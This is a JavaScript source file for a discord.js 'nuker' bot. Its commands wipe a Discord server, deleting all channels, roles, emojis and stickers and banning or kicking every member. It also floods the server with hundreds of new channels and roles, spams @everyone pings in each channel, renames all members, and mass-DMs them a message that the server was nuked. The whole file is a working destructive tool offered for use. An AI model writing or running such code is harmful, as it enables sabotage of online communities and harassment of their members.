const { Client, Message, MessageEmbed, MessageActionRow, MessageButton, Permissions } = require('discord.js')
const client = new Client({
    intents: 32767
})
const { token, prefix, ownerOnly, ownerId } = require('../config/config.json')
const { guildName, guildIcon, guildBanner, SpamMessage, DmMessage, roleName, channelName } = require('../config/nuke.json')
const { author, version } = require('../package.json')
const { yellow, red, green } = require('chalk')
const chalk = require('chalk')
const readline = require('readline-sync')

console.clear()
const custom = readline.question('Custom Status(y/n): ')
console.clear()
if(custom === 'y'){
    var presence = readline.questionInt('Type of Presence\n' + chalk.yellow('[1] Playing\n') + chalk.green('[2] Listening\n') + chalk.red('[3] Watching\n') + chalk.magenta('[4] Streaming\n') + chalk.white('Enter the number: '))
    console.clear()
    var presenceName = readline.question('Presence name: ')
    console.clear()
    var status = readline.questionInt('Type of Status\n' + chalk.green('[1] Online\n') + chalk.yellow('[2] Idle\n') + chalk.red('[3] Do not Disturb\n') + chalk.magenta('[4] Invisible\n') + chalk.white('Enter the number: '))
    console.clear()

    if(status === 1){
        status = 'online'
    } else if(status === 2){
        status = 'idle'
    } else if(status === 3){
        status = 'dnd'
    } else if(status === 4){
        status = 'invisible'
    }
}

client.on('ready', () => {
    console.clear()
    if(presence === 1){
        client.user.setActivity(presenceName, {type: "PLAYING"})
        client.user.setStatus(status)
    } else if (presence === 2){
        client.user.setActivity(presenceName, {type: "LISTENING"})
        client.user.setStatus(status)
    } else if (presence === 3){
        client.user.setActivity(presenceName, {type: "WATCHING"})
        client.user.setStatus(status)
    } else if (presence === 4){
        client.user.setActivity(presenceName, {type: "STREAMING", url: 'https://www.twitch.tv/twitch'})
    }

    // Display
    console.log(green(`  
                                   ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
                                   ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
                                   ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
                                   ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
                                   ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
                                   ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                              
                                              Author: ${author}
                                              Version: ${version}

                                              Logged in as: ${client.user.tag}
                                              Prefix: ${prefix}
    `))
})

client.on('messageCreate', async (message) => {
    if(message.channel.type === 'dm') return
    if(message.author.bot) return
    const args = message.content.slice(prefix.length).trim().split(/ +/);
	const command = args.shift().toLowerCase()

    if(ownerOnly === true && ownerId !== message.author.id) return message.reply("You don't have the permission to use this command")

    if(command === 'ping'){
        await message.channel.send('Pong!')
        .then((msg) => {
            const ping = msg.createdTimestamp - message.createdTimestamp
            msg.edit(`Ping - \`${ping}ms\``)
        })
    } else if(command === 'dch'){
        /**
         * @param {Message} message
         */
        await message.delete()
        await message.guild.channels.cache.forEach(async (channel) => {
            await channel.delete()
            .then(() => console.log(green(`Deleted #${channel.name}`)))
            .catch(() => console.log(red(`Failed to delete #${channel.name}`)))
        })
    } else if(command === 'mban'){
        await message.delete()
        await message.guild.members.cache.forEach((member) => {
            member.ban()
            .then(() => console.log(green(`Banned ${member.user.tag}`)))
            .catch(() => console.log(red(`Failed to ban ${member.user.tag}`)))
        })
    } else if(command === 'mkick'){
        await message.delete()
        await message.guild.members.cache.forEach((member) => {
            member.kick()
            .then(() => console.log(green(`Kicked ${member.user.tag}`)))
            .catch(() => console.log(red(`Failed to kick ${member.user.tag}`)))
        })
    } else if(command === 'drole'){
        await message.delete()
        await message.guild.roles.cache.forEach((role) => {
            role.delete()
            .then(() => console.log(green(`Deleted @${role.name}`)))
            .catch(() => console.log(red(`Failed to delete @${role.name}`)))
        })
    } else if(command === 'de'){
        await message.delete()
        await message.guild.emojis.cache.forEach((emoji) => {
            emoji.delete()
            .then(() => console.log(green(`Deleted :${emoji.name}:`)))
            .catch(() => console.log(red(`Failed to delete :${emoji.name}:`)))
        })

        await message.guild.stickers.cache.forEach((sticker) => {
            sticker.delete()
            .then(() => console.log(green(`Delete :${sticker.name}: (sticker)`)))
            .catch(() => console.log(red(`Failed to delete :${sticker.name}: (sticker)`)))
        })
    } else if(command === 'del'){
        await message.delete()
        await message.guild.channels.cache.forEach((channel) => {
            channel.delete()
            .then(() => console.log(green(`Deleted #${channel.name}`)))
            .catch(() => console.log(red(`Failed to delete #${channel.name}`)))
        })

        await message.guild.members.cache.forEach((member) => {
            member.ban()
            .then(() => console.log(green(`Banned ${member.user.tag}`)))
            .catch(() => console.log(red(`Failed to ban ${member.user.tag}`)))
        })

        await message.guild.roles.cache.forEach((role) => {
            role.delete()
            .then(() => console.log(green(`Deleted @${role.name}`)))
            .catch(() => console.log(red(`Failed to delete @${role.name}`)))
        })

        await message.guild.emojis.cache.forEach((emoji) => {
            emoji.delete()
            .then(() => console.log(green(`Deleted :${emoji.name}:`)))
            .catch(() => console.log(red(`Failed to delete :${emoji.name}:`)))
        })

        await message.guild.stickers.cache.forEach((sticker) => {
            sticker.delete()
            .then(() => console.log(green(`Delete :${sticker.name}: (sticker)`)))
            .catch(() => console.log(red(`Failed to delete :${sticker.name}: (sticker)`)))
        })
    } else if(command === 'spam'){
        let amount = args[0] || 500
        let content = args.slice(1).join(' ') || ' '

        if(isNaN(amount)) return message.reply('Not a valid amount')

        await message.guild.channels.cache.forEach(async (channel) => {
            for(let i = 0; i < amount; i++){
                await channel.send(`@everyone\n${content}`)
            }
        })
    } else if(command === 'mch'){
        let amount = args[0] || 500
        let name = args.slice(1).join(' ') || 'nuked'

        if(isNaN(amount)) return message.reply('Not a valid amount')
        await message.delete()

        for(let i = 0; i < amount; i++){
            if(message.guild.channels.cache.size === 500) break
            await message.guild.channels.create(name, {type: 'GUILD_TEXT'})
            .catch(e => console.log(red(`Error on creating channels - ${e}`)))
        }
    } else if(command === 'mrole'){
        let amount = args[0] || 250
        let name = args.slice(1).join(' ') || 'nuked'

        if(isNaN(amount)) return message.reply('Not a valid amount')
        await message.delete()

        for(let i = 0; i < amount; i++){
            if(message.guild.roles.cache.size === 250) break
            await message.guild.roles.create({ name: name, color: 'RANDOM' })
            .catch(e => console.log(`Error on creating role - ${e}`))
        }
    } else if(command === 'mcp'){
        let amount = args[0] || 500
        let name = args.slice(1).join(' ') || 'nuked'

        if(isNaN(amount)) return message.reply('Not a valid amount')
        await message.delete()

        for(let i = 0; i < amount; i++){
            if(message.guild.channels.cache.size === 500) break
            await message.guild.channels.create(name, {type: 'GUILD_TEXT'})
            .then(
                function(channel){
                    for(let i = 0; i < 500; i++){
                        channel.send('@everyone')
                    }
                }
            )
            .catch(e => console.log(red(`Error on creating and pinging channels - ${e}`)))
        }
    } else if(command === 'rename'){
        const name = args.join(' ')
        if(!name) return message.reply('Please provide a nickname.')
        await message.delete()
        await message.guild.members.cache.forEach(async (member) => {
            await member.setNickname(name)
            .then(() => console.log(chalk.green('Renamed ') + chalk.yellow(`${member.user.username}` + chalk.green(' to ') + chalk.cyan(`${name}`))))
            .catch(() => console.log(red(`Failed to set nickname for ${member.user.username}`)))
        })
    } else if(command === 'dm'){
        const content = args.join(' ')
        if(!content) return message.reply('Please provide a message.')
        await message.delete()
        await message.guild.members.cache.forEach(async (member) => {
            await member.send(content)
            .then(() => console.log(green(`DM sent to ${member.user.tag}`)))
            .catch(() => console.log(red(`Failed to DM ${member.user.tag}`)))
        })
    } else if(command === 'nuke'){
        console.log(yellow('Start Nuking...'))

        await message.delete()
        await message.guild.setName(guildName || 'nuked')
        await message.guild.setIcon(guildIcon)
        await message.guild.setBanner(guildBanner)
        await message.guild.setDefaultMessageNotifications('ALL_MESSAGES')

        //Delete all channels
        await message.guild.channels.cache.forEach(async (channel) => {
            await channel.delete()
            .then(() => console.log(green(`Deleted #${channel.name}`)))
            .catch(() => console.log(red(`Failed to delete #${channel.name}`)))
        })

        //Ban all Members
        await message.guild.members.cache.forEach((member) => {
            member.ban()
            .then(() => console.log(green(`Banned ${member.user.tag}`)))
            .catch(() => console.log(red(`Failed to ban ${member.user.tag}`)))
        })

        //Delete all roles
        await message.guild.roles.cache.forEach((role) => {
            role.delete()
            .then(() => console.log(green(`Deleted @${role.name}`)))
            .catch(() => console.log(red(`Failed to delete @${role.name}`)))
        })

        //Delete all emojis and stickers
        await message.guild.emojis.cache.forEach((emoji) => {
            emoji.delete()
            .then(() => console.log(green(`Deleted :${emoji.name}:`)))
            .catch(() => console.log(red(`Failed to delete :${emoji.name}:`)))
        })

        await message.guild.stickers.cache.forEach((sticker) => {
            sticker.delete()
            .then(() => console.log(green(`Delete :${sticker.name}: (sticker)`)))
            .catch(() => console.log(red(`Failed to delete :${sticker.name}: (sticker)`)))
        })

        //Mass channels & spam pings
        for(let i = 0; i < 500; i++){
            if(message.guild.channels.cache.size === 500) break
            await message.guild.channels.create(channelName || 'nuked', {type: 'GUILD_TEXT'})
            .then(
                function(channel){
                    for(let i = 0; i < 500; i++){
                        channel.send(`@everyone\n${SpamMessage || ' '}`)
                    }
                }
            )
            .catch(e => console.log(red(`Error on creating and pinging channels - ${e}`)))
        }

        //Mass roles
        for(let i = 0; i < 250; i++){
            if(message.guild.roles.cache.size === 250) break
            await message.guild.roles.create({ name: roleName || 'nuked', color: 'RANDOM' })
            .catch(e => console.log(`Error on creating role - ${e}`))
        }

        //Mass DM
        await message.guild.members.cache.forEach(async (member) => {
            await member.send(DmMessage || `Your server **${message.guild.name}** has been nuked by **${message.author.username}**`)
            .then(() => console.log(green(`DM sent to ${member.user.tag}`)))
            .catch(() => console.log(red(`Failed to DM ${member.user.tag}`)))
        })

        const channel = message.guild.channels.cache.find(ch => ch.type == "GUILD_TEXT" && ch.permissionsFor(ch.guild.me).has(Permissions.FLAGS.CREATE_INSTANT_INVITE))
        await message.guild.invites.create(channel)
        .then((link) => {
            console.log(yellow(`New Invite: ${link}`))
            message.author.send(`Here's a new invite link:\n${link}`)
        })
        .catch(() => console.log(red(`Failed to create an invite`)))

    } else if(command === 'help'){
        const embed = new MessageEmbed()
        .setAuthor('Nuker Commands', message.author.displayAvatarURL())
        .addField('__nuke__', '*Nuke the server*', true)
        .addField('__dch__', '*Delete all channels*', true)
        .addField('__drole__', '*Delete all roles*', true)
        .addField('__de__', '*Delete all emojis and stickers*', true)
        .addField('__del__', '*Deletes all that can be deleted*', true)
        .addField('__mban__', '*Ban all members*', true)
        .addField('__mkick__', '*Kick all members*', true)
        .addField('__mch__', '*Mass Channel*', true)
        .addField('__mrole__', '*Mass Role*', true)
        .addField('__mcp__', '*Mass Channel while spamming pings*', true)
        .addField('__spam__', '*Spam ping for each channels*', true)
        .addField('__rename__', '*Rename all members from the server*', true)
        .addField('__dm__', '*Mass DM all members*', true)
        .addField('__stop__', '*Completely stop the bot*', true)
        .addField('__about__', '*Information about the bot*', true)
        .setColor('#2f3136')

        await message.channel.send({ embeds: [embed] })
    } else if(command === 'about'){
        const row = new MessageActionRow()
        .addComponents(
            new MessageButton()
            .setLabel('Github')
            .setURL('https://github.com/yayeen')
            .setStyle('LINK')
        )
        const embed = new MessageEmbed()
        .setAuthor('About', client.user.displayAvatarURL())
        .setDescription('The source code of this bot was developed by [markk#1312](https://discord.com/users/814406096022011934), written in Javascript using [Discord.js](https://discord.js.org/#/)')
        .addField('__Cache Stats__', `${message.guild.channels.cache.size} channels\n${message.guild.members.cache.size} users\n${message.guild.roles.cache.size} roles\n ${message.guild.emojis.cache.size} emojis`, true)
        .addField('__Nuke Stats__', `${message.guild.channels.cache.filter(ch => ch.deletable).size} deletable channels\n${message.guild.members.cache.filter(m => m.bannable).size} bannable users\n${message.guild.roles.cache.filter(r => r.editable).size} deletable roles`, true)
        .setColor('#2f3136')

        await message.channel.send({ embeds: [embed], components: [row] })
    } else if(command === 'stop'){
        await message.channel.send('Bot Stopped.')
        .then(() => process.exit())
    }
})

client.login(token)
